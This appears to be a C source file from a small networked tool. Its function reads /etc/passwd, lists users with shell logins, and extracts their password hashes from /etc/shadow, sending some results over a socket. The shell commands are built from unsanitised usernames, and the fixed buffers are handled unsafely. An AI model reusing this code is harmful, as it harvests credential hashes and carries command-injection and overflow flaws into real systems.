#include "credentials_utils.h"

/// /etc/shadow original permissions: 640
//cat /etc/passwd | egrep "(\/bin\/bash)|(\/bin\/sh)" | cut -f1 -d: |tr "\n" " "
//Momentan folosim system pentru convenienta :)
void etc_passwd_shadow_checker(int sock_fd)
{
    int fd_passwd=open("/etc/passwd",O_RDONLY);

    char contents[BUFFSIZE*20];

    if(fd_passwd==-1)
    {   
        char msg[]="/etc/passwd could not be opened.\n";
        write(sock_fd,msg,strlen(msg));
        return;
    }
    else 
    {   
        char *command = "cat /etc/passwd | egrep \"(/bin/bash)|(/bin/sh)\" | cut -f1 -d: | tr \"\n\" \" \"";
        FILE* fp=popen(command,"r");

        int fd_users=fileno(fp);
        char users[1024];
        read(fd_users,users,1024);
        
        strcpy(contents,"Potential users with login:");
        //myWrite("Potential users with login:",STDOUT_FILENO);
        //myWrite(users,STDOUT_FILENO);
        strcat(contents,users);
        strcat(contents,"\n");

        int fd_shadow=open("/etc/shadow",O_RDONLY);

        if(fd_shadow==-1)
        {
            char msg[]="/etc/shadow could not be opened.\n";
            //write(fd_out,msg,strlen(msg));
            strcat(contents,"/etc/shadow couldn't be opened");
            write(sock_fd,contents,sizeof(contents));
            send(sock_fd, "<END_OF_DATA>", strlen("<END_OF_DATA>"),0);
            return;
        }
    
        char user_array[50][50];
        int nr_users=0; 
        char *p=strtok(users," ");

        while(p!=NULL)
        {
            strcpy(user_array[nr_users++],p);
            p=strtok(NULL," ");
        }
        printf("Useri: %d",nr_users);
        for(int i=0;i<nr_users;i++)
        {   
            //write(fd_out,user_array[i],strlen(user_array[i]));
            char command2[1000];
            strcpy(command2,"cat /etc/shadow | egrep \"");
            strcat(command2,user_array[i]);
            strcat(command2,"\" | cut -f1,2 -d:");
            fp=popen(command2,"r");
            int fd_user=fileno(fp);
            char userdata[300];
            read(fd_user,userdata,300);
            strcat(contents,userdata);
        }
        //send(sock_fd,contents,sizeof(contents),0);
        myWrite(contents,STDOUT_FILENO);
        send(sock_fd, "<END_OF_DATA>", strlen("<END_OF_DATA>"),0);
        printf("size of contents: %d",sizeof(contents));
    }
    
}

